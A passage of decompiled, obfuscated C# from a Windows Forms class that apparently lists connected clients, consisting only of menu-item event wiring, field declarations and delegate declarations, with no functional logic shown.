	internal void vmethod_253(ToolStripMenuItem toolStripMenuItem_66)
	{
		EventHandler value = new EventHandler(this.method_126);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_60;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_60 = toolStripMenuItem_66;
		toolStripMenuItem = this.toolStripMenuItem_60;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x060014E5 RID: 5349 RVA: 0x0000B114 File Offset: 0x00009314
	internal ToolStripSeparator vmethod_254()
	{
		return this.toolStripSeparator_21;
	}

	// Token: 0x060014E6 RID: 5350 RVA: 0x0000B11C File Offset: 0x0000931C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_255(ToolStripSeparator toolStripSeparator_24)
	{
		this.toolStripSeparator_21 = toolStripSeparator_24;
	}

	// Token: 0x060014E7 RID: 5351 RVA: 0x0000B125 File Offset: 0x00009325
	internal ToolStripMenuItem vmethod_256()
	{
		return this.toolStripMenuItem_61;
	}

	// Token: 0x060014E8 RID: 5352 RVA: 0x000A5A40 File Offset: 0x000A3C40
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_257(ToolStripMenuItem toolStripMenuItem_66)
	{
		EventHandler value = new EventHandler(this.method_127);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_61;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_61 = toolStripMenuItem_66;
		toolStripMenuItem = this.toolStripMenuItem_61;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x060014E9 RID: 5353 RVA: 0x0000B12D File Offset: 0x0000932D
	internal ToolStripMenuItem vmethod_258()
	{
		return this.toolStripMenuItem_62;
	}

	// Token: 0x060014EA RID: 5354 RVA: 0x000A5A84 File Offset: 0x000A3C84
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_259(ToolStripMenuItem toolStripMenuItem_66)
	{
		EventHandler value = new EventHandler(this.method_128);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_62;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_62 = toolStripMenuItem_66;
		toolStripMenuItem = this.toolStripMenuItem_62;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x060014EB RID: 5355 RVA: 0x0000B135 File Offset: 0x00009335
	internal ToolStripMenuItem vmethod_260()
	{
		return this.toolStripMenuItem_63;
	}

	// Token: 0x060014EC RID: 5356 RVA: 0x000A5AC8 File Offset: 0x000A3CC8
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_261(ToolStripMenuItem toolStripMenuItem_66)
	{
		EventHandler value = new EventHandler(this.method_129);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_63;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_63 = toolStripMenuItem_66;
		toolStripMenuItem = this.toolStripMenuItem_63;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x060014ED RID: 5357 RVA: 0x0000B13D File Offset: 0x0000933D
	internal ToolStripMenuItem vmethod_262()
	{
		return this.toolStripMenuItem_64;
	}

	// Token: 0x060014EE RID: 5358 RVA: 0x000A5B0C File Offset: 0x000A3D0C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_263(ToolStripMenuItem toolStripMenuItem_66)
	{
		EventHandler value = new EventHandler(this.method_130);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_64;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_64 = toolStripMenuItem_66;
		toolStripMenuItem = this.toolStripMenuItem_64;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x060014EF RID: 5359 RVA: 0x0000B145 File Offset: 0x00009345
	internal ToolStripSeparator vmethod_264()
	{
		return this.toolStripSeparator_22;
	}

	// Token: 0x060014F0 RID: 5360 RVA: 0x0000B14D File Offset: 0x0000934D
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_265(ToolStripSeparator toolStripSeparator_24)
	{
		this.toolStripSeparator_22 = toolStripSeparator_24;
	}

	// Token: 0x060014F1 RID: 5361 RVA: 0x0000B156 File Offset: 0x00009356
	internal ToolStripSeparator vmethod_266()
	{
		return this.toolStripSeparator_23;
	}

	// Token: 0x060014F2 RID: 5362 RVA: 0x0000B15E File Offset: 0x0000935E
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_267(ToolStripSeparator toolStripSeparator_24)
	{
		this.toolStripSeparator_23 = toolStripSeparator_24;
	}

	// Token: 0x060014F3 RID: 5363 RVA: 0x0000B167 File Offset: 0x00009367
	internal ToolStripMenuItem vmethod_268()
	{
		return this.toolStripMenuItem_65;
	}

	// Token: 0x060014F4 RID: 5364 RVA: 0x000A5B50 File Offset: 0x000A3D50
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_269(ToolStripMenuItem toolStripMenuItem_66)
	{
		EventHandler value = new EventHandler(this.method_131);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_65;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_65 = toolStripMenuItem_66;
		toolStripMenuItem = this.toolStripMenuItem_65;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x04000785 RID: 1925
	public cIPInfo cIPInfo_0;

	// Token: 0x04000786 RID: 1926
	public Struct18 struct18_0;

	// Token: 0x04000787 RID: 1927
	private GClass2 gclass2_0;

	// Token: 0x04000788 RID: 1928
	private readonly IPEndPoint ipendPoint_0;

	// Token: 0x04000789 RID: 1929
	private Thread thread_0;

	// Token: 0x0400078A RID: 1930
	private Struct18 struct18_1;

	// Token: 0x0400078B RID: 1931
	private Thread thread_1;

	// Token: 0x0400078C RID: 1932
	private Thread thread_2;

	// Token: 0x0400078D RID: 1933
	private Struct18 struct18_2;

	// Token: 0x0400078E RID: 1934
	private Struct18 struct18_3;

	// Token: 0x0400078F RID: 1935
	private Struct16 struct16_0;

	// Token: 0x04000790 RID: 1936
	private CounterSample counterSample_0;

	// Token: 0x04000791 RID: 1937
	private readonly PerformanceCounter performanceCounter_0;

	// Token: 0x04000792 RID: 1938
	public CClient cclient_0;

	// Token: 0x04000793 RID: 1939
	public Point point_0;

	// Token: 0x04000794 RID: 1940
	public MouseEventArgs mouseEventArgs_0;

	// Token: 0x04000795 RID: 1941
	private readonly ConcurrentStack<CClient> concurrentStack_0;

	// Token: 0x04000796 RID: 1942
	private readonly ConcurrentStack<CClient> concurrentStack_1;

	// Token: 0x04000797 RID: 1943
	private readonly ConcurrentStack<CClient> concurrentStack_2;

	// Token: 0x04000798 RID: 1944
	private Struct7 struct7_0;

	// Token: 0x04000799 RID: 1945
	private Struct18 struct18_4;

	// Token: 0x0400079A RID: 1946
	private Struct16 struct16_1;

	// Token: 0x0400079B RID: 1947
	private Struct18 struct18_5;

	// Token: 0x0400079C RID: 1948
	private GClass5 gclass5_0;

	// Token: 0x0400079D RID: 1949
	private GClass5 gclass5_1;

	// Token: 0x0400079E RID: 1950
	private int int_0;

	// Token: 0x040007A0 RID: 1952
	private StatusStrip statusStrip_0;

	// Token: 0x040007A1 RID: 1953
	private ToolStripStatusLabel toolStripStatusLabel_0;

	// Token: 0x040007A2 RID: 1954
	private ToolStripStatusLabel toolStripStatusLabel_1;

	// Token: 0x040007A3 RID: 1955
	private ToolStripStatusLabel toolStripStatusLabel_2;

	// Token: 0x040007A4 RID: 1956
	private ToolStripStatusLabel toolStripStatusLabel_3;

	// Token: 0x040007A5 RID: 1957
	private ToolStripStatusLabel toolStripStatusLabel_4;

	// Token: 0x040007A6 RID: 1958
	private ToolStripProgressBar toolStripProgressBar_0;

	// Token: 0x040007A7 RID: 1959
	private FastObjectListView fastObjectListView_0;

	// Token: 0x040007A8 RID: 1960
	private OLVColumn olvcolumn_0;

	// Token: 0x040007A9 RID: 1961
	private OLVColumn olvcolumn_1;

	// Token: 0x040007AA RID: 1962
	private OLVColumn olvcolumn_2;

	// Token: 0x040007AB RID: 1963
	private OLVColumn olvcolumn_3;

	// Token: 0x040007AC RID: 1964
	private OLVColumn olvcolumn_4;

	// Token: 0x040007AD RID: 1965
	private OLVColumn olvcolumn_5;

	// Token: 0x040007AE RID: 1966
	private OLVColumn olvcolumn_6;

	// Token: 0x040007AF RID: 1967
	private OLVColumn olvcolumn_7;

	// Token: 0x040007B0 RID: 1968
	private OLVColumn olvcolumn_8;

	// Token: 0x040007B1 RID: 1969
	private OLVColumn olvcolumn_9;

	// Token: 0x040007B2 RID: 1970
	private OLVColumn olvcolumn_10;

	// Token: 0x040007B3 RID: 1971
	private OLVColumn olvcolumn_11;

	// Token: 0x040007B4 RID: 1972
	private ContextMenuStrip contextMenuStrip_0;

	// Token: 0x040007B5 RID: 1973
	private ToolStripMenuItem toolStripMenuItem_0;

	// Token: 0x040007B6 RID: 1974
	private ToolStripMenuItem toolStripMenuItem_1;

	// Token: 0x040007B7 RID: 1975
	private ToolStripMenuItem toolStripMenuItem_2;

	// Token: 0x040007B8 RID: 1976
	private ToolStripMenuItem toolStripMenuItem_3;

	// Token: 0x040007B9 RID: 1977
	private ToolStripMenuItem toolStripMenuItem_4;

	// Token: 0x040007BA RID: 1978
	private ToolStripMenuItem toolStripMenuItem_5;

	// Token: 0x040007BB RID: 1979
	private ToolStripMenuItem toolStripMenuItem_6;

	// Token: 0x040007BC RID: 1980
	private ToolStripMenuItem toolStripMenuItem_7;

	// Token: 0x040007BD RID: 1981
	private ToolStripSeparator toolStripSeparator_0;

	// Token: 0x040007BE RID: 1982
	private ToolStripMenuItem toolStripMenuItem_8;

	// Token: 0x040007BF RID: 1983
	private ToolStripMenuItem toolStripMenuItem_9;

	// Token: 0x040007C0 RID: 1984
	private ToolStripSeparator toolStripSeparator_1;

	// Token: 0x040007C1 RID: 1985
	private ToolStripMenuItem toolStripMenuItem_10;

	// Token: 0x040007C2 RID: 1986
	private ToolStripMenuItem toolStripMenuItem_11;

	// Token: 0x040007C3 RID: 1987
	private ToolStripSeparator toolStripSeparator_2;

	// Token: 0x040007C4 RID: 1988
	private ToolStripMenuItem toolStripMenuItem_12;

	// Token: 0x040007C5 RID: 1989
	private ToolStripMenuItem toolStripMenuItem_13;

	// Token: 0x040007C6 RID: 1990
	private ToolStripMenuItem toolStripMenuItem_14;

	// Token: 0x040007C7 RID: 1991
	private OLVColumn olvcolumn_12;

	// Token: 0x040007C8 RID: 1992
	private ToolStripMenuItem toolStripMenuItem_15;

	// Token: 0x040007C9 RID: 1993
	private ToolStripSeparator toolStripSeparator_3;

	// Token: 0x040007CA RID: 1994
	private OLVColumn olvcolumn_13;

	// Token: 0x040007CB RID: 1995
	private System.Windows.Forms.Timer timer_0;

	// Token: 0x040007CC RID: 1996
	private ZeroitWin8ProgressRing zeroitWin8ProgressRing_0;

	// Token: 0x040007CD RID: 1997
	private OLVColumn olvcolumn_14;

	// Token: 0x040007CE RID: 1998
	private OLVColumn olvcolumn_15;

	// Token: 0x040007CF RID: 1999
	private BackgroundWorker backgroundWorker_0;

	// Token: 0x040007D0 RID: 2000
	private BackgroundWorker backgroundWorker_1;

	// Token: 0x040007D1 RID: 2001
	private BackgroundWorker backgroundWorker_2;

	// Token: 0x040007D2 RID: 2002
	private ToolStripMenuItem toolStripMenuItem_16;

	// Token: 0x040007D3 RID: 2003
	private ToolStripMenuItem toolStripMenuItem_17;

	// Token: 0x040007D4 RID: 2004
	private ToolStripSeparator toolStripSeparator_4;

	// Token: 0x040007D5 RID: 2005
	private ToolStripMenuItem toolStripMenuItem_18;

	// Token: 0x040007D6 RID: 2006
	private ToolStripMenuItem toolStripMenuItem_19;

	// Token: 0x040007D7 RID: 2007
	private ToolStripMenuItem toolStripMenuItem_20;

	// Token: 0x040007D8 RID: 2008
	private ToolStripMenuItem toolStripMenuItem_21;

	// Token: 0x040007D9 RID: 2009
	private ToolStripMenuItem toolStripMenuItem_22;

	// Token: 0x040007DA RID: 2010
	private ToolStripSeparator toolStripSeparator_5;

	// Token: 0x040007DB RID: 2011
	private ToolStripSeparator toolStripSeparator_6;

	// Token: 0x040007DC RID: 2012
	private ToolStripMenuItem toolStripMenuItem_23;

	// Token: 0x040007DD RID: 2013
	private ToolStripMenuItem toolStripMenuItem_24;

	// Token: 0x040007DE RID: 2014
	private ToolStripMenuItem toolStripMenuItem_25;

	// Token: 0x040007DF RID: 2015
	private ToolStripSeparator toolStripSeparator_7;

	// Token: 0x040007E0 RID: 2016
	private ToolStripMenuItem toolStripMenuItem_26;

	// Token: 0x040007E1 RID: 2017
	private ToolStripMenuItem toolStripMenuItem_27;

	// Token: 0x040007E2 RID: 2018
	private ToolStripMenuItem toolStripMenuItem_28;

	// Token: 0x040007E3 RID: 2019
	private ToolStripSeparator toolStripSeparator_8;

	// Token: 0x040007E4 RID: 2020
	private ToolStripMenuItem toolStripMenuItem_29;

	// Token: 0x040007E5 RID: 2021
	private ToolStripSeparator toolStripSeparator_9;

	// Token: 0x040007E6 RID: 2022
	private ToolStripMenuItem toolStripMenuItem_30;

	// Token: 0x040007E7 RID: 2023
	private BackgroundWorker backgroundWorker_3;

	// Token: 0x040007E8 RID: 2024
	private BackgroundWorker backgroundWorker_4;

	// Token: 0x040007E9 RID: 2025
	private ToolStripMenuItem toolStripMenuItem_31;

	// Token: 0x040007EA RID: 2026
	private BackgroundWorker backgroundWorker_5;

	// Token: 0x040007EB RID: 2027
	private BackgroundWorker backgroundWorker_6;

	// Token: 0x040007EC RID: 2028
	private BackgroundWorker backgroundWorker_7;

	// Token: 0x040007ED RID: 2029
	private ToolStripMenuItem toolStripMenuItem_32;

	// Token: 0x040007EE RID: 2030
	private ToolStripMenuItem toolStripMenuItem_33;

	// Token: 0x040007EF RID: 2031
	private ToolStripMenuItem toolStripMenuItem_34;

	// Token: 0x040007F0 RID: 2032
	private ToolStripSeparator toolStripSeparator_10;

	// Token: 0x040007F1 RID: 2033
	private BackgroundWorker backgroundWorker_8;

	// Token: 0x040007F2 RID: 2034
	private ToolStripSeparator toolStripSeparator_11;

	// Token: 0x040007F3 RID: 2035
	private ToolStripMenuItem toolStripMenuItem_35;

	// Token: 0x040007F4 RID: 2036
	private ToolStripMenuItem toolStripMenuItem_36;

	// Token: 0x040007F5 RID: 2037
	private ToolStripSeparator toolStripSeparator_12;

	// Token: 0x040007F6 RID: 2038
	private ToolStripMenuItem toolStripMenuItem_37;

	// Token: 0x040007F7 RID: 2039
	private ToolStripMenuItem toolStripMenuItem_38;

	// Token: 0x040007F8 RID: 2040
	private ToolStripMenuItem toolStripMenuItem_39;

	// Token: 0x040007F9 RID: 2041
	private ToolStripMenuItem toolStripMenuItem_40;

	// Token: 0x040007FA RID: 2042
	private ToolStripSeparator toolStripSeparator_13;

	// Token: 0x040007FB RID: 2043
	private ToolStripMenuItem toolStripMenuItem_41;

	// Token: 0x040007FC RID: 2044
	private ToolStripMenuItem toolStripMenuItem_42;

	// Token: 0x040007FD RID: 2045
	private ToolStripMenuItem toolStripMenuItem_43;

	// Token: 0x040007FE RID: 2046
	private ToolStripMenuItem toolStripMenuItem_44;

	// Token: 0x040007FF RID: 2047
	private ToolStripSeparator toolStripSeparator_14;

	// Token: 0x04000800 RID: 2048
	private ToolStripMenuItem toolStripMenuItem_45;

	// Token: 0x04000801 RID: 2049
	private BackgroundWorker backgroundWorker_9;

	// Token: 0x04000802 RID: 2050
	private ToolStripSeparator toolStripSeparator_15;

	// Token: 0x04000803 RID: 2051
	private ToolStripMenuItem toolStripMenuItem_46;

	// Token: 0x04000804 RID: 2052
	private ToolStripMenuItem toolStripMenuItem_47;

	// Token: 0x04000805 RID: 2053
	private ToolStripSeparator toolStripSeparator_16;

	// Token: 0x04000806 RID: 2054
	private ToolStripSeparator toolStripSeparator_17;

	// Token: 0x04000807 RID: 2055
	private ToolStripMenuItem toolStripMenuItem_48;

	// Token: 0x04000808 RID: 2056
	private ToolStripSeparator toolStripSeparator_18;

	// Token: 0x04000809 RID: 2057
	private System.Windows.Forms.Timer timer_1;

	// Token: 0x0400080A RID: 2058
	private OLVColumn olvcolumn_16;

	// Token: 0x0400080B RID: 2059
	private OLVColumn olvcolumn_17;

	// Token: 0x0400080C RID: 2060
	private ToolStripMenuItem toolStripMenuItem_49;

	// Token: 0x0400080D RID: 2061
	private BackgroundWorker backgroundWorker_10;

	// Token: 0x0400080E RID: 2062
	private BackgroundWorker backgroundWorker_11;

	// Token: 0x0400080F RID: 2063
	private ToolStripMenuItem toolStripMenuItem_50;

	// Token: 0x04000810 RID: 2064
	private ToolStripSeparator toolStripSeparator_19;

	// Token: 0x04000811 RID: 2065
	private ToolStripMenuItem toolStripMenuItem_51;

	// Token: 0x04000812 RID: 2066
	private ToolStripMenuItem toolStripMenuItem_52;

	// Token: 0x04000813 RID: 2067
	private ToolStripMenuItem toolStripMenuItem_53;

	// Token: 0x04000814 RID: 2068
	private ToolStripMenuItem toolStripMenuItem_54;

	// Token: 0x04000815 RID: 2069
	private ToolStripMenuItem toolStripMenuItem_55;

	// Token: 0x04000816 RID: 2070
	private ToolStripMenuItem toolStripMenuItem_56;

	// Token: 0x04000817 RID: 2071
	private ToolStripMenuItem toolStripMenuItem_57;

	// Token: 0x04000818 RID: 2072
	private ToolStripMenuItem toolStripMenuItem_58;

	// Token: 0x04000819 RID: 2073
	private ToolStripMenuItem toolStripMenuItem_59;

	// Token: 0x0400081A RID: 2074
	private ToolStripSeparator toolStripSeparator_20;

	// Token: 0x0400081B RID: 2075
	private OLVColumn olvcolumn_18;

	// Token: 0x0400081C RID: 2076
	private ToolStripMenuItem toolStripMenuItem_60;

	// Token: 0x0400081D RID: 2077
	private ToolStripSeparator toolStripSeparator_21;

	// Token: 0x0400081E RID: 2078
	private ToolStripMenuItem toolStripMenuItem_61;

	// Token: 0x0400081F RID: 2079
	private ToolStripMenuItem toolStripMenuItem_62;

	// Token: 0x04000820 RID: 2080
	private ToolStripMenuItem toolStripMenuItem_63;

	// Token: 0x04000821 RID: 2081
	private ToolStripMenuItem toolStripMenuItem_64;

	// Token: 0x04000822 RID: 2082
	private ToolStripSeparator toolStripSeparator_22;

	// Token: 0x04000823 RID: 2083
	private ToolStripSeparator toolStripSeparator_23;

	// Token: 0x04000824 RID: 2084
	private ToolStripMenuItem toolStripMenuItem_65;

	// Token: 0x0200015F RID: 351
	// (Invoke) Token: 0x060014FE RID: 5374
	private delegate void Delegate116();

	// Token: 0x02000160 RID: 352
	// (Invoke) Token: 0x06001502 RID: 5378
	private delegate void Delegate117();

	// Token: 0x02000161 RID: 353
	// (Invoke) Token: 0x06001506 RID: 5382
	private delegate void Delegate118(ref string string_0);

	// Token: 0x02000162 RID: 354
	// (Invoke) Token: 0x0600150A RID: 5386
	private delegate void Delegate119();

	// Token: 0x02000163 RID: 355
	// (Invoke) Token: 0x0600150E RID: 5390
	private delegate void Delegate120();

	// Token: 0x02000164 RID: 356
	// (Invoke) Token: 0x06001512 RID: 5394
	private delegate void Delegate121(ref ToolStripProgressBar toolStripProgressBar_0, ref long long_0);

	// Token: 0x02000165 RID: 357
	// (Invoke) Token: 0x06001516 RID: 5398
	private delegate void Delegate122();

	// Token: 0x02000166 RID: 358
	// (Invoke) Token: 0x0600151A RID: 5402
	private delegate void Delegate123(ref CClient cclient_0, ref long long_0, ref long long_1);

	// Token: 0x02000167 RID: 359
	// (Invoke) Token: 0x0600151E RID: 5406
	private delegate void Delegate124(ref string string_0);

	// Token: 0x02000168 RID: 360
	// (Invoke) Token: 0x06001522 RID: 5410
	private delegate void Delegate125();

	// Token: 0x02000169 RID: 361
	// (Invoke) Token: 0x06001526 RID: 5414
	private delegate void Delegate126();

	// Token: 0x0200016A RID: 362
	// (Invoke) Token: 0x0600152A RID: 5418
	private delegate void Delegate127();

	// Token: 0x0200016B RID: 363
	// (Invoke) Token: 0x0600152E RID: 5422
	private delegate void Delegate128();

	// Token: 0x0200016C RID: 364
	// (Invoke) Token: 0x06001532 RID: 5426
	private delegate void Delegate129(ref string string_0, bool bool_0);

	// Token: 0x0200016D RID: 365
	// (Invoke) Token: 0x06001536 RID: 5430
	private delegate void Delegate130();

	// Token: 0x0200016E RID: 366
	// (Invoke) Token: 0x0600153A RID: 5434
	private delegate void Delegate131();

	// Token: 0x0200016F RID: 367
	// (Invoke) Token: 0x0600153E RID: 5438
	private delegate void Delegate132();

	// Token: 0x02000170 RID: 368
	// (Invoke) Token: 0x06001542 RID: 5442
	private delegate void Delegate133(bool bool_0);

	// Token: 0x02000171 RID: 369
	// (Invoke) Token: 0x06001546 RID: 5446
	private delegate void Delegate134();

	// Token: 0x02000172 RID: 370
	// (Invoke) Token: 0x0600154A RID: 5450
	private delegate void Delegate135();

	// Token: 0x02000173 RID: 371
	// (Invoke) Token: 0x0600154E RID: 5454
	private delegate void Delegate136();

	// Token: 0x02000174 RID: 372
	// (Invoke) Token: 0x06001552 RID: 5458
	private delegate void Delegate137();

	// Token: 0x02000175 RID: 373
	// (Invoke) Token: 0x06001556 RID: 5462
	private delegate void Delegate138();

	// Token: 0x02000176 RID: 374
	// (Invoke) Token: 0x0600155A RID: 5466
	private delegate void Delegate139();

	// Token: 0x02000177 RID: 375
	// (Invoke) Token: 0x0600155E RID: 5470
	private delegate void Delegate140(ref ConcurrentStack<CClient> concurrentStack_0);

	// Token: 0x02000178 RID: 376
	// (Invoke) Token: 0x06001562 RID: 5474
	private delegate void Delegate141();

	// Token: 0x02000179 RID: 377
	// (Invoke) Token: 0x06001566 RID: 5478
	private delegate void Delegate142(int int_0);

	// Token: 0x0200017A RID: 378
	// (Invoke) Token: 0x0600156A RID: 5482
	private delegate void Delegate143(ref CClient cclient_0, ref string string_0, ref string string_1, ref string string_2, ref string string_3, ref string string_4, ref string string_5, ref string string_6, ref string string_7, ref string string_8, ref string string_9, ref string string_10, ref string string_11, ref string string_12, ref string string_13, ref string string_14, ref string string_15);

	// Token: 0x0200017B RID: 379
	// (Invoke) Token: 0x0600156E RID: 5486
	private delegate void Delegate144();

	// Token: 0x0200017C RID: 380
	// (Invoke) Token: 0x06001572 RID: 5490
	private delegate void Delegate145();

	// Token: 0x0200017D RID: 381
	// (Invoke) Token: 0x06001576 RID: 5494
	private delegate void Delegate146();

	// Token: 0x0200017E RID: 382
	// (Invoke) Token: 0x0600157A RID: 5498
	private delegate void Delegate147();

	// Token: 0x0200017F RID: 383
	// (Invoke) Token: 0x0600157E RID: 5502
	private delegate void Delegate148(ref string string_0);

	// Token: 0x02000180 RID: 384
	// (Invoke) Token: 0x06001582 RID: 5506
	private delegate void Delegate149();
}
